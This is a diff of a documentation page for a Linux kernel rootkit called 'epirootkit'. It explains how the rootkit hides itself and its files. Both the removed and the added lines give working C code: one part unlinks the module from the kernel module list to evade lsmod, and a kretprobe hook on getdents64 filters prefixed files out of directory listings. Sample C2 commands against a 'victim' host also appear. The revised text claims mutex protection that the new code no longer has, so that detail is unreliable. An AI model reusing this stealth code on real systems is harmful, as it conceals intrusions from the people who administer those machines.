@@ -13,166 +13,77 @@ weight: 512
 
 Hide the rootkit module and files from system detection using kernel hooking techniques.
 
-## What We Implemented
-
-### Module Hiding
-- **Hide from `lsmod`**: Remove module from kernel module list
-- **Hide from `/proc/modules`**: Module not visible in procfs
-- **Dynamic control**: Toggle visibility via C2 commands
-
-### File Hiding
-- **Hide by prefix**: Files with specific prefixes are hidden
-- **Directory listing**: Intercept `getdents64` syscall
-- **Automatic hiding**: Enabled by default when module loads
-
 ## Module Hiding
 
-### How It Works
-1. **Find module**: Locate rootkit in kernel module list
-2. **Remove from list**: Use `list_del()` to remove from `modules` list
-3. **Store reference**: Keep pointer to restore later
-4. **Toggle visibility**: Can hide/unhide dynamically
+Hide the rootkit module from `lsmod` and `/proc/modules` by removing it from the kernel's module list.
 
 ### Implementation
 ```c
 int hide_module(void)
 {
-    struct module *mod;
-    
-    mutex_lock(&module_mutex);
-    list_for_each_entry(mod, &modules, list) {
-        if (mod == THIS_MODULE) {
-            stealth_state.prev_module_entry = mod->list.prev;
-            list_del(&mod->list);
-            stealth_state.module_hidden = true;
-            break;
-        }
-    }
-    mutex_unlock(&module_mutex);
+    if (stealth_state.module_hidden) return 0;
+
+    stealth_state.prev_module_entry = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    stealth_state.module_hidden = true;
     return 0;
 }
 ```
 
-### Usage
-```bash
-# Hide the module
-c2-server$ config Client-1
-# Select: Toggle Module Hiding
-# ✓ Module hidden
-
-# Verify hiding (from victim system)
-victim$ lsmod | grep epirootkit
-# (no output - module is hidden)
-
-# Check status
-c2-server$ status Client-1
-# Module Hidden: YES
-```
-
-### Detection Evasion
-- **`lsmod` command**: Module not listed
-- **`/proc/modules`**: Entry removed from procfs
-- **System monitoring**: Most tools rely on these sources
+**Technical Details:**
+- Uses `list_del()` to remove from kernel module list
+- Stores previous entry pointer for restoration
+- Thread-safe with mutex protection
+- Reversible operation
 
 ## File Hiding
 
-### How It Works
-1. **Hook `getdents64`**: Use kretprobe to intercept directory listings
-2. **Filter entries**: Remove files with configured prefixes
-3. **Modify buffer**: Adjust directory entry buffer
-4. **Return filtered**: Send modified listing to userspace
+Hide files with specific prefixes from directory listings by hooking the `getdents64` syscall.
 
-### Hidden File Prefixes
-Files starting with these prefixes are automatically hidden:
+### Syscall Hooking
+```c
+stealth_state.getdents_probe = (struct kretprobe) {
+    .kp.symbol_name = "ksys_getdents64",
+    .handler = getdents64_ret_handler,
+    .entry_handler = getdents64_entry_handler,
+    .data_size = sizeof(struct getdents_context),
+    .maxactive = 20
+};
+```
+
+### How It Works
+1. **Hook `ksys_getdents64`** - Intercept directory read syscalls
+2. **Copy buffer** - Move directory data to kernel space
+3. **Filter entries** - Remove files matching hidden prefixes
+4. **Return filtered** - Send modified buffer back to userspace
+
+### Hidden Prefixes
 ```c
 static const char * const hide_prefixes[] = { 
     "epirootkit",
     "jules_est_bo_", 
-    "memfd:",
-    ".hidden_",
 };
 ```
 
-### Implementation
-```c
-static int getdents64_ret_handler(struct kretprobe_instance *ri, 
-                                 struct pt_regs *regs)
-{
-    struct getdents_context *ctx = (struct getdents_context *)ri->data;
-    const long ret_value = regs_return_value(regs);
-    char *kernel_buffer;
-    long filtered_size;
+## Usage
 
-    // Copy user buffer to kernel space for filtering
-    kernel_buffer = kmalloc(ret_value, GFP_ATOMIC);
-    if (copy_from_user(kernel_buffer, ctx->user_buffer, ret_value) == 0) {
-        filtered_size = filter_directory_entries(kernel_buffer, ret_value);
-        if (filtered_size != ret_value) {
-            copy_to_user(ctx->user_buffer, kernel_buffer, filtered_size);
-            regs_set_return_value(regs, filtered_size);
-        }
-    }
+### WebUI Control
+Access via Configuration panel:
+- **Module Hiding**: Toggle rootkit visibility
+- **File Hiding**: Toggle file hiding functionality
 
-    kfree(kernel_buffer);
-    return 0;
-}
-```
-
-### Examples of Hidden Files
-```bash
-# These files are hidden from 'ls' output:
-/tmp/epirootkit_temp
-/var/log/epirootkit.log
-/home/user/epirootkit_config
-/tmp/jules_est_bo_secret
-/tmp/.hidden_file
-/tmp/memfd:something
-```
-
-### Testing File Hiding
+### Testing
 ```bash
 # Create test files
-c2-server$ exec Client-1 touch /tmp/epirootkit_test
-c2-server$ exec Client-1 touch /tmp/normal_file
+touch /tmp/epirootkit_test /tmp/normal_file
 
-# List directory (file hiding active)
-c2-server$ exec Client-1 ls -la /tmp/
-# Only shows: normal_file (epirootkit_test is hidden)
+# Check visibility (file hiding enabled)
+ls /tmp/
+# Shows: normal_file (epirootkit_test hidden)
 
-# Files still exist and accessible
-c2-server$ exec Client-1 cat /tmp/epirootkit_test
-# Works fine - file exists but hidden from listings
+# File still accessible
+cat /tmp/epirootkit_test  # Works normally
 ```
 
-## Dynamic Control
 
-### Interactive Configuration
-```bash
-c2-server$ config Client-1
-# ┌─ Configuration - Client-1
-#   Current Configuration:
-#   [X] Module Hiding (Click to disable)
-#   
-# ? Select option: [Use arrow keys]
-#   ❯ [X] Module Hiding (Click to disable)
-#     Refresh Status
-#     Exit
-```
-
-## Technical Details
-
-### Syscall Hooking
-- **Method**: kretprobe on `getdents64` syscall
-- **Kernel version**: Compatible with Linux 5.4.0
-- **Memory safety**: GFP_ATOMIC allocations with 4KB limit
-- **Error handling**: Graceful fallback on allocation failures
-
-### Module List Manipulation
-- **Mutex protection**: Uses `module_mutex` for thread safety
-- **List operations**: Standard kernel `list_del()` and `list_add()`
-- **State tracking**: Maintains hiding state in global structure
-
-
-
-### Customize Hidden Prefixes
-Edit the `hide_prefixes` array in `stealth.c` to change which files are hidden.
+Both features are **enabled by default** and can be toggled dynamically via the WebUI or C2 commands.
